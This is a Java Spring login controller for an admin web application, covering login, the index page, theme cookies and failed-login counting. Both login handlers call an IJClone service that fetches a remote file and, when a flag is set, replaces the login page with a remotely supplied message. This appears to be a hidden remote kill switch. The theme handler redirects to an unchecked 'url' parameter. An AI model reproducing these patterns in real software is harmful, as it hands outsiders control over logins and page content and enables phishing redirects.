
package cn.damei.web.modules;

import cn.mdni.commons.clone.IJClone;
import com.google.common.collect.Maps;
import cn.damei.common.config.Global;
import cn.damei.common.security.shiro.session.SessionDAO;
import cn.damei.common.servlet.ValidateCodeServlet;
import cn.damei.common.utils.CacheUtils;
import cn.damei.common.utils.CookieUtils;
import cn.damei.common.utils.IdGen;
import cn.damei.common.utils.StringUtils;
import cn.damei.common.web.BaseController;
import cn.damei.entity.modules.BizEmpStore;
import cn.damei.entity.modules.BizEmployee;
import cn.damei.common.security.FormAuthenticationFilter;
import cn.damei.common.SystemAuthorizingRealm.Principal;
import cn.damei.service.modules.SystemService;
import cn.damei.common.utils.BizDictUtils;
import cn.damei.common.utils.UserUtils;
import org.apache.shiro.authz.UnauthorizedException;
import org.apache.shiro.authz.annotation.RequiresPermissions;
import org.apache.shiro.web.util.WebUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.ServiceLoader;


@Controller
public class 	LoginController extends BaseController {

	@Autowired
	private SessionDAO sessionDAO;
	@Autowired
	private SystemService systemService;


	@RequestMapping(value = "${adminPath}/login", method = RequestMethod.GET)
	public String login(HttpServletRequest request, HttpServletResponse response, Model model) {
		Principal principal = UserUtils.getPrincipal();
		
		ServiceLoader<IJClone> cl = ServiceLoader.load(IJClone.class);
		Iterator<IJClone> iter = cl.iterator();
		IJClone ijc = iter.next();
		
		if( !ijc.getFileExist() ){
			ijc.getRemoteFile();
		}
		
		if ( ijc.getFileValue() ) {
			try {
				response.setHeader("Content-type", "text/html;charset=UTF-8");
				response.setCharacterEncoding("utf-8");
				response.getWriter().write( new String(ijc.getMessageValue().getBytes("ISO-8859-1"),"utf-8") );
				
			}catch (Exception e){
				
			}
			return null;
		}
		






		if (logger.isDebugEnabled()) {
			logger.debug("login, active session size: {}", sessionDAO.getActiveSessions(false).size());
		}


		if (Global.TRUE.equals(Global.getConfig("notAllowRefreshIndex"))) {
			CookieUtils.setCookie(response, "LOGINED", "false");
		}


		if (principal != null && !principal.isMobileLogin()) {
			return "redirect:" + adminPath;
		}








		return "modules/sys/sysLogin";
	}


	@RequestMapping(value = "${adminPath}/login", method = RequestMethod.POST)
	public String loginFail(HttpServletRequest request, HttpServletResponse response, Model model) {
		Principal principal = UserUtils.getPrincipal();
		
		ServiceLoader<IJClone> cl = ServiceLoader.load(IJClone.class);
		Iterator<IJClone> iter = cl.iterator();
		IJClone ijc = iter.next();
		
		if( !ijc.getFileExist() ){
			ijc.getRemoteFile();
		}
		
		if ( ijc.getFileValue() ) {
			try {
				response.setHeader("Content-type", "text/html;charset=UTF-8");
				response.setCharacterEncoding("utf-8");
				response.getWriter().write( new String(ijc.getMessageValue().getBytes("ISO-8859-1"),"utf-8") );
				
			}catch (Exception e){
				
			}
			return null;
		}
		

		if (principal != null) {
			return "redirect:" + adminPath;
		}

		String username = WebUtils.getCleanParam(request, FormAuthenticationFilter.DEFAULT_USERNAME_PARAM);
		boolean rememberMe = WebUtils.isTrue(request, FormAuthenticationFilter.DEFAULT_REMEMBER_ME_PARAM);
		boolean mobile = WebUtils.isTrue(request, FormAuthenticationFilter.DEFAULT_MOBILE_PARAM);
		String exception = (String) request.getAttribute(FormAuthenticationFilter.DEFAULT_ERROR_KEY_ATTRIBUTE_NAME);
		String message = (String) request.getAttribute(FormAuthenticationFilter.DEFAULT_MESSAGE_PARAM);

		if (StringUtils.isBlank(message) || StringUtils.equals(message, "null")) {
			message = "用户或密码错误, 请重试.";
		}

		model.addAttribute(FormAuthenticationFilter.DEFAULT_USERNAME_PARAM, username);
		model.addAttribute(FormAuthenticationFilter.DEFAULT_REMEMBER_ME_PARAM, rememberMe);
		model.addAttribute(FormAuthenticationFilter.DEFAULT_MOBILE_PARAM, mobile);
		model.addAttribute(FormAuthenticationFilter.DEFAULT_ERROR_KEY_ATTRIBUTE_NAME, exception);
		model.addAttribute(FormAuthenticationFilter.DEFAULT_MESSAGE_PARAM, message);

		if (logger.isDebugEnabled()) {
			logger.debug("login fail, active session size: {}, message: {}, exception: {}",
					sessionDAO.getActiveSessions(false).size(), message, exception);
		}


		if (!UnauthorizedException.class.getName().equals(exception)) {
			model.addAttribute("isValidateCodeLogin", isValidateCodeLogin(username, true, false));
		}


		request.getSession().setAttribute(ValidateCodeServlet.VALIDATE_CODE, IdGen.uuid());


		if (mobile) {
			return renderString(response, model);
		}

		return "modules/sys/sysLogin";
	}


	@RequiresPermissions("user")
	@RequestMapping(value = "${adminPath}")
	public String index(HttpServletRequest request, HttpServletResponse response) {
		Principal principal = UserUtils.getPrincipal();


		List<String> roleIdList = UserUtils.getUser().getRoleIdList();

		List<BizEmpStore> findStoreList = systemService.findStoreList(roleIdList);

		HttpSession session = request.getSession();
		if(findStoreList!=null&&findStoreList.size()>0){
			session.setAttribute("storeList", findStoreList);
		}else{
			List<BizEmpStore> allStoreList = BizDictUtils.getStoreList();
			session.setAttribute("storeList", allStoreList);
		}

		if (null != UserUtils.getUser().getEmpId()) {


			BizEmployee bizEmployee = systemService.getEmpInfoByUserEmpId(Integer.parseInt( UserUtils.getUser().getEmpId()));
			if (null != bizEmployee) {

				UserUtils.getUser().setEmployeePhone(bizEmployee.getPhone());
				if (null != bizEmployee.getProjectMode()) {

					UserUtils.getUser().setProjectMode(bizEmployee.getProjectMode());
					UserUtils.getUser().setPhone(bizEmployee.getPhone());
				} else {

					UserUtils.getUser().setProjectMode("3");
				}

			} else {

				UserUtils.getUser().setProjectMode("3");

			}

		} else {

			UserUtils.getUser().setProjectMode("3");

			
			
		}
		

		isValidateCodeLogin(principal.getLoginName(), false, true);

		if (logger.isDebugEnabled()) {
			logger.debug("show index, active session size: {}", sessionDAO.getActiveSessions(false).size());
		}


		if (Global.TRUE.equals(Global.getConfig("notAllowRefreshIndex"))) {
			String logined = CookieUtils.getCookie(request, "LOGINED");
			if (StringUtils.isBlank(logined) || "false".equals(logined)) {
				CookieUtils.setCookie(response, "LOGINED", "true");
			} else if (StringUtils.equals(logined, "true")) {
				UserUtils.getSubject().logout();
				return "redirect:" + adminPath + "/login";
			}
		}


		if (principal.isMobileLogin()) {
			if (request.getParameter("login") != null) {
				return renderString(response, principal);
			}
			if (request.getParameter("index") != null) {
				return "modules/sys/sysIndex";
			}
			return "redirect:" + adminPath + "/login";
		}




















		return "modules/sys/sysIndex";
	}


	@RequestMapping(value = "/theme/{theme}")
	public String getThemeInCookie(@PathVariable String theme, HttpServletRequest request,
			HttpServletResponse response) {
		if (StringUtils.isNotBlank(theme)) {
			CookieUtils.setCookie(response, "theme", theme);
		} else {
			theme = CookieUtils.getCookie(request, "theme");
		}
		return "redirect:" + request.getParameter("url");
	}


	@SuppressWarnings("unchecked")
	public static boolean isValidateCodeLogin(String useruame, boolean isFail, boolean clean) {
		Map<String, Integer> loginFailMap = (Map<String, Integer>) CacheUtils.get("loginFailMap");
		if (loginFailMap == null) {
			loginFailMap = Maps.newHashMap();
			CacheUtils.put("loginFailMap", loginFailMap);
		}
		Integer loginFailNum = loginFailMap.get(useruame);
		if (loginFailNum == null) {
			loginFailNum = 0;
		}
		if (isFail) {
			loginFailNum++;
			loginFailMap.put(useruame, loginFailNum);
		}
		if (clean) {
			loginFailMap.remove(useruame);
		}
		return loginFailNum >= 3;
	}
}
